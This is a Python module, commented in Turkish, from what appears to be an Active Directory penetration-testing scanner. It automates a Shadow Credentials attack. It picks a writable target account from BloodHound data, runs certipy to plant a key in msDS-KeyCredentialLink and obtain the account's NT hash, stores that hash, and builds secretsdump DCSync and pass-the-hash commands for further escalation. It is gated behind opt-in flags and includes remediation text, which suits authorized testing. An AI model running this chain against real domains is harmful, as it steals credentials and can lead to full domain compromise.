"""Shadow Credentials istismarı (certipy shadow auto) — AKTİF, opt-in.

Owned kimlik bir hedef hesapta (Computer/User) **AddKeyCredentialLink** (ya da
GenericWrite/GenericAll) hakkına sahipse, `msDS-KeyCredentialLink`'e sahte bir
anahtar yazıp PKINIT ile o hesabın TGT'sini ve NT hash'ini alabilir — parola
sıfırlamadan, iz bırakmadan. Bu, Key Admins / GenericAll kenarlarının (bkz.
[[bhpath.first-degree]]) doğrudan istismarıdır ve DC hedeflenirse DA'ya gider.

Hedef seçimi:
  * `--shadow-target <sAMAccountName>` verilmişse o kullanılır.
  * Verilmemişse toplanan BloodHound grafiğinden, owned kimliğin AddKeyCredentialLink/
    GenericAll/GenericWrite kenarı olan ilk Computer/User otomatik seçilir.

AKTİF saldırı: hedefin msDS-KeyCredentialLink özniteliğini DEĞİŞTİRİR (certipy
sonrası geri temizler). Yalnız yazılı izinli ortamda; `--active-attacks` onayıyla.
"""

from __future__ import annotations

import re

from ..findings import Credential, Finding, ScanReport, Severity
from ..runner import CommandResult, ToolStatus, resolve_tool, run, strip_dryrun

CERTIPY_CANDIDATES = ["certipy", "certipy-ad"]


def tool() -> ToolStatus:
    return resolve_tool(CERTIPY_CANDIDATES)


def _pick_target_from_bh(ctx) -> str | None:
    """BloodHound grafiğinden owned kimliğin shadow-cred uygulayabileceği hedefi seçer."""
    try:
        from .. import bhpath
    except ImportError:
        return None
    g = bhpath.load_graph(ctx.outdir)
    if not g.nodes:
        return None
    owned = {u.lower() for u in [ctx.username or ""] if u}
    sids = {g.name2sid.get(n) or g.name2sid.get(n.split("@", 1)[0]) for n in owned}
    sids = {s for s in sids if s}
    if not sids:
        return None
    fd = bhpath.first_degree_control(g, sids)
    # Öncelik: AddKeyCredentialLink > GenericAll > GenericWrite; Computer > User
    prefer_right = ["AddKeyCredentialLink", "GenericAll", "GenericWrite", "WriteDacl", "Owner"]
    cands = [(r, n, t) for (r, n, t) in fd if t in ("Computer", "User")
             and r in prefer_right]
    if not cands:
        return None
    cands.sort(key=lambda x: (prefer_right.index(x[0]), 0 if x[2] == "Computer" else 1))
    name = cands[0][1]
    # "DC01.DOM@DOM" / "DC01$@DOM" -> sAMAccountName
    return name.split("@", 1)[0]


def scan(ctx, *, timeout: int = 300) -> list[CommandResult]:
    if ctx.username is None or not (ctx.password or ctx.nthash):
        return [CommandResult(tool="shadow:skip", argv=[], returncode=None, stdout="",
                              stderr="", duration=0.0, error="shadow: kimlik gerekli")]
    if not tool().available:
        return [CommandResult(tool="shadow:skip", argv=[], returncode=None, stdout="",
                              stderr="", duration=0.0, error="certipy bulunamadı")]
    target_account = ctx.shadow_target or _pick_target_from_bh(ctx)
    if not target_account:
        return [CommandResult(tool="shadow:skip", argv=[], returncode=None, stdout="",
                              stderr="", duration=0.0,
                              error="shadow: hedef yok (--shadow-target verin ya da önce "
                                    "--bloodhound ile AddKeyCredentialLink kenarı toplayın)")]
    user = f"{ctx.username}@{ctx.domain}" if ctx.domain else ctx.username
    creds = ["-hashes", f":{ctx.nthash}"] if ctx.nthash else ["-p", ctx.password or ""]
    argv = [tool().name, "shadow", "auto", "-u", user, "-account", target_account,
            "-dc-ip", ctx.target] + creds
    res = run(argv, tool="shadow-auto", timeout=timeout, dry_run=ctx.dry_run)
    # hedef adını sonuca iliştir (parse için)
    res.stdout = f"[adscan shadow-target] {target_account}\n" + (res.stdout or "")
    return [res]


_NT_RX = re.compile(r"(?:NT(?:LM)?\s*hash|Got hash for .+?:)\s*[:]?\s*"
                    r"(?:[0-9a-f]{32}:)?([0-9a-f]{32})", re.IGNORECASE)
_TARGET_RX = re.compile(r"\[adscan shadow-target\]\s+(\S+)")


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["shadow"] = "\n\n".join(r.combined for r in results)
    first = results[0] if results else None
    if first and first.tool == "shadow:skip":
        if first.error:
            report.add_error(f"shadow: {first.error}")
        return
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    tgt_m = _TARGET_RX.search(combined)
    account = tgt_m.group(1) if tgt_m else "?"
    nt = _NT_RX.search(combined)
    if not nt:
        if first and not first.ok:
            report.add_error(f"shadow: {first.error or 'certipy shadow auto başarısız'}")
        return
    nthash = nt.group(1)
    report.add_credential(Credential(username=account, secret=nthash, kind="nthash",
                                     domain=report.domain or "", source="shadow",
                                     host=report.target, admin=account.endswith("$")))
    is_dc = account.upper().startswith("DC") or account.endswith("$")
    report.add(Finding(
        title=f"Shadow Credentials ile '{account}' NT hash'i ele geçirildi — certipy",
        severity=Severity.CRITICAL, target=report.target, source="shadow",
        control_id="adcs.shadowcred", mitre="T1649", verification="exploited",
        reference="Shadow Credentials (msDS-KeyCredentialLink + PKINIT)",
        description="Owned kimliğin hedef hesap üzerindeki yazma hakkı kullanılarak "
                    "msDS-KeyCredentialLink'e anahtar eklendi ve PKINIT ile hesabın NT "
                    "hash'i/TGT'si alındı." + (" Hedef bir makine/DC hesabı — DA'ya götürür."
                                               if is_dc else ""),
        evidence=f"Hedef hesap: {account}\nNT hash elde edildi (pass-the-hash'e hazır).",
        remediation="Hedef hesapta yazma (AddKeyCredentialLink/GenericWrite/GenericAll) "
                    "haklarını kaldır; Key Admins üyeliklerini denetle.",
        poc=f"certipy shadow auto -u <user>@<dom> -p <pass> -account {account} -dc-ip {report.target}",
        escalation=(f"secretsdump.py -hashes :{nthash} <dom>/'{account}'@{report.target} -just-dc"
                    if is_dc else
                    f"pass-the-hash: nxc smb <host> -u {account} -H {nthash}")))


# ---------------------------------------------------------------------------
from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx, timeout=ctx.timeout)


MODULE = ScanModule(
    name="shadow",
    label="Shadow Credentials istismarı (certipy shadow auto, opt-in + aktif)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
    active=True,
)
